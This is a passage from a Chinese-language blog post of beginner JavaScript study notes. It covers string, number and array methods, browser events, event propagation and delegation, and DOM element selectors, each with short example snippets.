num)：返回ex第一次出现的位置，从第num处开始；可以将indexof替换成lastof</p></li><li><p>str.search(ex)：查询ex第一个匹配项的位置</p></li><li><p>str.split(‘ex’)：以ex为分割方式将str分割为字符数组</p></li><li><p>str.trim：字符串的两端删除空格，但不能去除字符串之间的空白，空格可以是制表符或空格</p></li><li><p>str.replace(ex1, ex2)：将第一个匹配的ex1替换成ex2,ex1可使用正则进行全匹配</p></li><li><p>str.slice(num1,num2)：提取字符串的一部分，并将其作为新字符串返回，而无需修改原始字符串。</p></li><li><p>str.charAt(num)：返回字符串中指定索引处的字符</p></li></ul><h3 id="JavaScript数值及方法"><a href="#JavaScript数值及方法" class="headerlink" title="JavaScript数值及方法"></a>JavaScript数值及方法</h3><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><ul><li><p>JavaScript只有一种数字类型，没有整数和浮点数的单独指定，用var声明</p></li><li><p>JavaScript中的数字被认为是准确的，最多15位数字。这意味着数字将在到达第16位后四舍五入</p></li><li><p>JavaScript数字允许用科学计数法e，与C语言类似</p></li><li><p>字符串 + 数字的结果是拼接</p></li><li><p>数值字符串可以执行数学表达式，但是数值加法不可执行</p><h5 id="NaN-非法数字："><a href="#NaN-非法数字：" class="headerlink" title="NaN-非法数字："></a>NaN-非法数字：</h5><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var x <span class="operator">=</span> <span class="number">50</span> / <span class="string">&quot;(cainiaojc.com)&quot;</span><span class="comment">;  // x  = NaN (Not a Number)</span></span><br></pre></td></tr></table></figure></li></ul><p>显而易见的</p><p>​使用全局JavaScript <a href="https://www.cainiaojc.com/jsref/global_isnan.html">isNaN()</a>函数来确定值是否为数字：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x <span class="operator">=</span> <span class="number">50</span> / <span class="string">&quot;(cainiaojc.com)&quot;</span><span class="comment">;</span></span><br><span class="line">isNaN(x)<span class="comment">;// 返回true，因为x不是一个数字</span></span><br></pre></td></tr></table></figure><p>​将值分配给NaN时，即使另一个数是合法数字，也将返回NaN</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="literal">NaN</span>;</span><br><span class="line"><span class="keyword">var</span> y = <span class="number">27</span>;</span><br><span class="line"><span class="keyword">var</span> z = x + y;  <span class="comment">// z  = NaN</span></span><br></pre></td></tr></table></figure><h5 id="JavaScript无穷"><a href="#JavaScript无穷" class="headerlink" title="JavaScript无穷"></a>JavaScript无穷</h5><p>正无穷：Infinity，负无穷：-Infinity</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var x <span class="operator">=</span> <span class="number">5</span> / <span class="number">0</span><span class="comment">;   // 将返回无穷</span></span><br><span class="line">var y <span class="operator">=</span> -<span class="number">5</span> / <span class="number">0</span><span class="comment">;  // 将返回负无穷</span></span><br></pre></td></tr></table></figure><p>数值上限：1.797693134862315E+308</p><p>数值下限：-1.797693134862316E+308</p><h5 id="JavaScript基数"><a href="#JavaScript基数" class="headerlink" title="JavaScript基数"></a>JavaScript基数</h5><blockquote><p>默认情况下，JavaScript将数字显示为以<strong>10</strong>为<strong>基数的</strong>小数。</p><p>数字也可以用十六进制（基数16），二进制（基数2）和八进制（基数8）表示。</p></blockquote><p>二进制前缀：0b</p><p>八进制前缀：0</p><p>十六进制前缀：0x</p><h5 id="数字基元和数字对象"><a href="#数字基元和数字对象" class="headerlink" title="数字基元和数字对象"></a>数字基元和数字对象</h5><p>弱等于，但是不强等于，数值对象无法比较。</p><h3 id="JavaScript数组及方法"><a href="#JavaScript数组及方法" class="headerlink" title="JavaScript数组及方法"></a>JavaScript数组及方法</h3><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><p>JavaScript中的数组是一种全局对象，用于在单个变量中存储多个值。</p><p>创建数组数组通常用于将相似数据类型的列表组合在一起，但是从技术上讲，它们可以包含任何值或值的混合，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> myArray = [<span class="number">5</span>, <span class="number">22</span>, <span class="string">&quot;Arrow&quot;</span>, <span class="string">&quot;Bone&quot;</span>, <span class="literal">true</span>, <span class="keyword">new</span> <span class="title class_">Date</span>()];</span><br></pre></td></tr></table></figure><p>在上文中介绍了两种方法创建数组：方括号和<strong>new</strong>关键字（尽量避免<strong>new</strong>）</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">let fruits</span> = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Mango&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fruits = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Mango&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>);</span><br></pre></td></tr></table></figure><p>向数组添加元素</p><p>看个例子：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let fruits = [<span class="string">&quot;Apple&quot;</span>, <span class="string">&quot;Mango&quot;</span>, <span class="string">&quot;Banana&quot;</span>, <span class="string">&quot;Orange&quot;</span>];</span><br><span class="line">fruits[<span class="number">4</span>] = <span class="string">&quot;Guava&quot;</span>;</span><br></pre></td></tr></table></figure><p>一切正常，但是如果：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fruits[<span class="number">6</span>] <span class="operator">=</span> <span class="string">&quot;Strawberry&quot;</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p>跳过的都将创建值为空(“”)的元素</p><p>附：通过Array.length查看数组长度</p><h4 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h4><p>Array.toString()：将数组转换为（逗号分隔）数组值的字符串。</p><p>Array.join(ex)：将数组转换为（ ex 分隔）数组值的字符串，默认是逗号。</p><p>Arrary.push(ex)：添加元素ex到数组，并返回新的数组长度。</p><p>Array.unshift(ex1, ex2, ···)：一个或多个新元素添加到数组的开头，并返回新的数组长度。</p><p>Array.pop()：删除数组末尾的最后一个元素，并返回“popped out（弹出）”的值。</p><p>Array.shift()：从数组中删除开始的第一个元素，并返回被“移出（shifted out）”的元素。</p><p>Array.splice(s_num, sum, ex)：对现有元素和（或）添加新元素来更改数组。s_num为开始索引值，sum表示对多少个元素进行操作，ex为添加的元素。</p><p>Array.concat(array)：Array与array合并。</p><p>Array.slice(begin, sum)：将数组的一部分复制到新数组。如果省略第二个参数，则该<a href="https://www.cainiaojc.com/jsref/array_slice.html">slice()</a>方法将切出数组的其余部分。允许使用负值。</p><p>Array.indexOf(ex)：返回可以在数组中找到元素ex的第一个索引。如果ex在数组中不存在，返回 -1。lastindexOf()同理。</p><p>Array.fill(ex, begin, final)：用一个静态值替换数组中的范围内的元素，左闭右开。</p><p>Array.reverse()：反转数组中元素的顺序。</p><p>Array.sort()：根据元素中的第一个字符对数组中的元素进行排序。 在第一个字符相同的情况下，它将继续向下一行并比较第二个字符，依此类推。先排大写。</p><h4 id="数组迭代"><a href="#数组迭代" class="headerlink" title="数组迭代"></a>数组迭代</h4><h5 id="Array-forEach-ex-index-Array"><a href="#Array-forEach-ex-index-Array" class="headerlink" title="Array.forEach(ex, index, Array)"></a>Array.forEach(ex, index, Array)</h5><p>该方法对数组的每个元素执行一次提供的函数（一个回调函数）</p><p>该函数带有3个参数，由于2个参数（索引，数组）是可选的，因此我们可以跳过它们：</p><ul><li>元素值（必填）</li><li>元素索引（可选）</li><li>数组本身（可选）</li></ul><h5 id="Array-map-ex-index-Array"><a href="#Array-map-ex-index-Array" class="headerlink" title="Array.map(ex, index, Array)"></a>Array.map(ex, index, Array)</h5><p>该方法返回一个新数组，不会改变原始数组。同时新数组中的元素为原始数组元素调用函数处理后的值，并按照原始数组元素顺序依次处理元素。</p><p>该方法与**Array.forEach(ex, index, Array)**类似</p><h5 id="Array-filter-ex-index-Array"><a href="#Array-filter-ex-index-Array" class="headerlink" title="Array.filter(ex, index, Array)"></a>Array.filter(ex, index, Array)</h5><p>该方法把Array的某些元素过滤掉，然后返回剩下的元素。其主要原理是 filter会把传入的函数依次作用于每个元素，然后根据返回值是 true 还是false决定保留还是丢弃该元素。</p><p>Array.reduce(result, ex, index, Array)</p><p>接收一个函数作为累加器，数组中的每个值（从左到右）开始缩减，最终计算为一个值。这在数字中很常见，例如找到数组中所有数字的总和。</p><p>该函数采用4个参数：</p><ul><li>初始值&#x2F;先前返回的值（必填）</li><li>元素值（必填）</li><li>元素索引（可选）</li><li>数组本身（可选）</li></ul><h5 id="Array-find-ex-index-Array"><a href="#Array-find-ex-index-Array" class="headerlink" title="Array.find(ex, index, Array)"></a>Array.find(ex, index, Array)</h5><p>该方法返回通过给定检测的数组中的第一个值。</p><h5 id="Array-findIndex-ex-index-Array"><a href="#Array-findIndex-ex-index-Array" class="headerlink" title="Array.findIndex(ex, index, Array)"></a>Array.findIndex(ex, index, Array)</h5><p>该方法返回通过给定检测的数组中的第一个索引值。</p><h5 id="Array-every-ex-index-Array"><a href="#Array-every-ex-index-Array" class="headerlink" title="Array.every(ex, index, Array)"></a>Array.every(ex, index, Array)</h5><p>该方法用于检测数组所有元素是否都符合指定条件（通过函数提供检测）。</p><h2 id="JavaScript事件"><a href="#JavaScript事件" class="headerlink" title="JavaScript事件"></a>JavaScript事件</h2><h3 id="概述："><a href="#概述：" class="headerlink" title="概述："></a>概述：</h3><blockquote><p>事件是在浏览器中发生的操作，可由用户或浏览器本身启动。</p><p>每个可用事件都有一个<strong>事件处理程序</strong>，该<strong>事件处理程序</strong>是代码块（通常是用户定义的JavaScript函数），将在事件触发时运行。</p></blockquote><p>举几个例子：</p><ul><li>页面加载完成</li><li>用户单击一个按钮</li><li>用户滚动文档</li><li>用户调整浏览器大小</li><li>用户移动鼠标</li><li>用户提交表单</li><li>用户按下键盘上的一个键</li><li>HTML输入字段已更改</li></ul><h4 id="使用事件的三种方式"><a href="#使用事件的三种方式" class="headerlink" title="使用事件的三种方式"></a>使用事件的三种方式</h4><ul><li>内联事件处理程序</li><li>事件处理程序属性</li><li>事件监听器</li></ul><h5 id="内联事件处理程序"><a href="#内联事件处理程序" class="headerlink" title="内联事件处理程序"></a>内联事件处理程序</h5><p>在HTML中，<code>onclick</code> 是一种事件属性（event attribute），它允许你为特定的HTML元素指定一个JavaScript代码块，在用户触发点击事件时执行这个代码块。具体说，<code>onclick</code> 属性用于定义鼠标单击事件的处理程序。</p><p>利用<strong>onclick</strong>属性，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h</span> <span class="attr">onclick</span>=<span class="string">&quot;funOne(this)&quot;</span>&gt;</span>Click me<span class="tag">&lt;/<span class="name">h</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">funOne</span>(<span class="params">self</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            self.<span class="property">innerHTML</span> = <span class="string">&#x27;As we know, PQ is a handsome!&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>附：内联事件处理程序是开始理解事件的简单方法，但通常不应将其用于测试和教育目的之外。</p><h5 id="事件处理程序属性"><a href="#事件处理程序属性" class="headerlink" title="事件处理程序属性"></a>事件处理程序属性</h5><p>利用<strong>id</strong>属性，如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;p id=<span class="string">&quot;id_one&quot;</span>&gt;<span class="title class_">Well</span>, I am a handsome.&lt;/p&gt;</span><br><span class="line"><span class="keyword">var</span> id_one = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;id_one&#x27;</span>)</span><br><span class="line">        id_one.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            id_one.<span class="property">innerHTML</span> = <span class="string">&#x27;The senctence is true.&#x27;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h5 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h5><p>onmouseover当将指针设备（通常是鼠标）移动到元素或其子元素之一时，将触发该事件。</p><p>onmouseout当将指针设备（通常是鼠标）移离元素或其子元素之一时，将触发该事件。</p><h3 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h3><h4 id="addEventListener-方法"><a href="#addEventListener-方法" class="headerlink" title="addEventListener()方法"></a>addEventListener()方法</h4><p>该方法将事件处理程序附加到指定的元素。</p><h5 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h5><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">element.addEventListener(<span class="keyword">event</span>, listener, useCapture)</span><br></pre></td></tr></table></figure><p>第一个参数是事件的类型（例如“ click”或“ mousemove”）。</p><p>第二个参数是事件发生时我们要调用的监听函数。</p><p>第三个参数是一个布尔值，指定是使用事件冒泡还是使用事件捕获。此参数是可选的。</p><p>注意，不要为事件使用“ on”前缀。使用“ click”代替“ onclick”。</p><h5 id="将事件监听添加到元素"><a href="#将事件监听添加到元素" class="headerlink" title="将事件监听添加到元素"></a>将事件监听添加到元素</h5><p>内部放入函数，如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> h1 = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;h1&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">    h1.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;HHHHHHH&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部引用，如下</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">h1</span><span class="selector-class">.addEventListener</span>(<span class="string">&#x27;mouseenter&#x27;</span>, abc)</span><br><span class="line">function <span class="built_in">abc</span>() &#123;</span><br><span class="line">    document<span class="selector-class">.write</span>(<span class="string">&#x27;click, click&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：第二个参数填函数名，没有括号。</p><h5 id="将多个事件监听添加到同一元素"><a href="#将多个事件监听添加到同一元素" class="headerlink" title="将多个事件监听添加到同一元素"></a>将多个事件监听添加到同一元素</h5><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;button&quot;</span>).addEventListener(<span class="string">&quot;mouseenter&quot;</span>, myFunc1);</span><br><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;button&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, myFunc2);</span><br><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;button&quot;</span>).addEventListener(<span class="string">&quot;mouseout&quot;</span>, myFunc3);</span><br></pre></td></tr></table></figure><h5 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h5><p>传递参数值时，请使用匿名函数，该函数使用参数调用指定的函数：</p><p>示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">btn.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">myFunc</span>(x, y);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h5 id="将事件监听添加到Window对象"><a href="#将事件监听添加到Window对象" class="headerlink" title="将事件监听添加到Window对象"></a>将事件监听添加到Window对象</h5><p>文档</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&quot;Hello World!!!&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>窗口</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;resize&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">box.<span class="property">innerHTML</span> = <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="removeEventListener-方法"><a href="#removeEventListener-方法" class="headerlink" title="removeEventListener()方法"></a>removeEventListener()方法</h4><p>该方法从元素中删除一个或所有事件，语法与addEventListener()一致。</p><h3 id="事件传播"><a href="#事件传播" class="headerlink" title="事件传播"></a>事件传播</h3><blockquote><p>事件传播是一种描述在Web浏览器中触发的事件“堆栈”的方法。</p></blockquote><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>有冒泡和捕获两种传播机制</p><p>语法：element.addEventListener(event, listener, useCapture)</p><blockquote><p>“useCapture”缺省值为false，它将默认使用冒泡传播；而将值设置为true时，事件将使用捕获传播。</p></blockquote><blockquote><p>在<strong>捕获</strong>阶段：</p><ul><li>浏览器将检查元素的最外层父级（html）是否在捕获阶段注册了onclick事件处理程序，如果是，则运行该事件处理程序。</li><li>然后，它移动到<a href="https://www.cainiaojc.com/tags/tag-html.html">中</a>的下一个元素并执行相同的操作，然后执行下一个，依此类推，直到到达实际单击的元素。</li></ul><p>在<strong>冒泡</strong>阶段，正好相反：</p><ul><li>浏览器检查在冒泡阶段实际单击的元素是否在其上注册了onclick事件处理程序，如果是，则运行该事件处理程序。</li><li>然后，它移动到下一个直接父级元素，然后再执行下一个，依次类推，直到到达html元素为止。</li></ul></blockquote><h4 id="停止事件传播"><a href="#停止事件传播" class="headerlink" title="停止事件传播"></a>停止事件传播</h4><p>可以使用event.stopPropagation()，如下：</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;div&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, myFunc);</span><br><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;p&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, myFunc);</span><br><span class="line"><span class="built_in">document</span>.<span class="built_in">querySelector</span>(<span class="string">&quot;a&quot;</span>).addEventListener(<span class="string">&quot;click&quot;</span>, myFunc);</span><br><span class="line"></span><br><span class="line">function myFunc() &#123;</span><br><span class="line">  alert(<span class="string">&quot;You clicked: &quot;</span>+ <span class="keyword">this</span>.tagName);</span><br><span class="line">  event.stopPropagation();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="访问目标元素"><a href="#访问目标元素" class="headerlink" title="访问目标元素"></a>访问目标元素</h4><p>目标元素，即<strong>event.target</strong></p><p>须知：在事件传播的捕获阶段，只有一个方向，即从最外层的祖先元素一直传播到目标元素。一旦到达目标元素，再往下传播到子元素的阶段，事件将进入冒泡阶段，这时才会再次触发事件处理程序。</p><blockquote><p>目标元素是已生成事件的DOM节点。</p><p>例如，如果用户单击超链接，则目标元素是超链接。</p><p>目标元素的访问方式为event.target，在事件传播阶段不会更改。</p></blockquote><h4 id="防止默认动作"><a href="#防止默认动作" class="headerlink" title="防止默认动作"></a>防止默认动作</h4><blockquote><p>某些事件具有与之关联的默认操作。例如，如果您单击链接浏览器，则将您带到链接的目标，当您单击表单提交按钮时，浏览器将提交表单等等。您可以使用event.preventDefault()事件对象的方法来防止此类默认操作。</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">myFunc</span>() &#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，阻止默认操作并不能阻止事件传播；事件继续照常传播到DOM树。</p><h4 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h4><blockquote><p>冒泡还使我们能够利用事件委托。</p></blockquote><p>如果你想在点击时弹出一条消息，你可以在父<ul>上设置click事件监听器，它会弹出alert，例子如下：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;parent-list&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-1&quot;</span>&gt;</span>Item 1<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-2&quot;</span>&gt;</span>Item 2<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-3&quot;</span>&gt;</span>Item 3<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-4&quot;</span>&gt;</span>Item 4<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-5&quot;</span>&gt;</span>Item 5<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="language-xml"><span class="tag">&lt;<span class="name">li</span> <span class="attr">id</span>=<span class="string">&quot;post-6&quot;</span>&gt;</span>Item 6<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;parent-list&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params">event</span>) </span></span><span class="language-xquery">&#123;</span></span><br><span class="line"><span class="language-xquery">  <span class="keyword">if</span>(event.target &amp;&amp; event.target.nodeName == <span class="string">&quot;LI&quot;</span>) &#123;</span></span><br><span class="line"><span class="language-xquery"> alert(<span class="string">&quot;List item &quot;</span> + event.target<span class="built_in">.id</span><span class="built_in">.replace</span>(<span class="string">&quot;post-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot; was clicked!&quot;</span>);</span></span><br><span class="line"><span class="language-xquery">  &#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">&#125;);</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="JS-HTML-DOM"><a href="#JS-HTML-DOM" class="headerlink" title="JS HTML DOM"></a>JS HTML DOM</h2><h3 id="概述：-1"><a href="#概述：-1" class="headerlink" title="概述："></a>概述：</h3><blockquote><p><strong>文档对象模型</strong>，通常被称为<strong>DOM</strong>，是使网站交互的一个重要部分。</p><p><strong>文档对象模型</strong>表示被显示在一个窗口中的HTML文档。</p><p>它是一个接口，允许JavaScript处理网站的内容，结构和样式。</p></blockquote><p>例子</p><blockquote><p>HTML DOM方法是可以对HTML元素执行的<strong>操作</strong>。</p><p>HTML DOM属性是可以设置或更改的HTML元素的<strong>值</strong>。</p></blockquote><p>在DOM中，所有HTML元素都定义为<strong>objects</strong></p><p>例子如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;para&quot;</span>).<span class="property">innerHTML</span> = <span class="string">&quot;Hello world&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>getElementById()是<strong>方法</strong>，innerHTML是<strong>属性</strong>。</p><h3 id="JS-HTML-DOM选择器"><a href="#JS-HTML-DOM选择器" class="headerlink" title="JS HTML DOM选择器"></a>JS HTML DOM选择器</h3><p>简单来说就是定位器，有以下方法：</p><ul><li>通过ID查找HTML元素</li><li>通过标签名称查找HTML元素</li><li>通过类名称查找HTML元素</li><li>通过CSS选择器查找HTML元素</li><li>通过HTML对象集合查找HTML元素</li></ul><h4 id="按ID查找"><a href="#按ID查找" class="headerlink" title="按ID查找"></a>按<strong>ID</strong>查找</h4><p>方法：getElementById()</p><p>例子：var x &#x3D; document.getElementById(“msg”);</p><h4 id="按标签查找"><a href="#按标签查找" class="headerlink" title="按标签查找"></a>按标签查找</h4><p>方法：getelementsByTagName()</p><p>例子：var x &#x3D; document.getElementsByTagName(“p”);</p><p>返回的是列表</p><h4 id="按类名称查找"><a href="#按类名称查找" class="headerlink" title="按类名称查找"></a>按类名称查找</h4><p>方法：getElementsByClassName()</p><p>例子：var x &#x3D; document.getElementsByClassName(“demo”);</p><p>返回的是列表</p><h4 id="通过CSS选择器查找"><a href="#通过CSS选择器查找" class="headerlink" title="通过CSS选择器查找"></a>通过CSS选择器查找</h4><p>方法：querySelectorAll()</p><p>例子：var x &#x3D; document.querySelectorAll(“div”);</p><h4 id="通过HTML对象集合"><a href="#通过HTML对象集合" class="headerlink" title="通过HTML对象集合"></a>通过HTML对象集合</h4><p>HTML文档中最顶层的元素可以直接用作文档属性。</p><p>例子：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var html <span class="operator">=</span> document.documentElement<span class="comment">;</span></span><br><span class="line">var body <span class="operator">=</span> document.body<span class="comment">;</span></span><br></pre></td></tr></table></figure><h3 id="JS-DOM-改变HTML内容"><a href="#JS-DOM-改变HTML内容" class="headerlink" title="JS DOM 改变HTML内容"></a>JS DOM 改变HTML内容</h3><h4 id="更改HTML内容"><a href="#更改HTML内容" class="headerlink" 